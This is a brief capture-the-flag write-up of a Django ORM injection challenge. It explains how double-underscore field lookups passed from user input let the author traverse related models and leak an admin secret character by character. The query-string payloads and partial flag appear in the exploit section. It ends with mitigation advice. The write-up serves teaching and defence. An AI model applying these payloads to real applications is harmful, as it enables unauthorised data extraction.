# Challenge: The Book Store (Django ORM Injection)
**Category:** Web

## 🕵️ Vulnerability Analysis
The application featured a book filtering system. Analysis of the request parameters suggested that the backend was passing user input directly into a Django `.filter()` query:

```python
# Hypothesized Backend Logic
books = Book.objects.filter(**{filter_field: filter_value})



By leveraging Django's Double Underscore (__) notation, I was able to traverse through the Book model into the User and Secret models to leak sensitive data.
 The Exploit

I used the startswith and contains field lookups to perform a blind data extraction. By testing characters one-by-one, I confirmed the content of the admin's secret.
Key Payloads:

    Model Traversal: ?filter_field=author__user__secret__content__startswith&filter_value=C
    Result: "1 book found" (Confirmed first character)

    Full Leak Path:
    ?filter_field=author__user__secret__content__startswith&filter_value=CSCG{orm_unlocked_


 Lessons Learned

Field lookups in Django are powerful but dangerous. Never pass raw user input as keys into a .filter() or .exclude() method. Instead, use a "whitelist" of allowed filter fields.
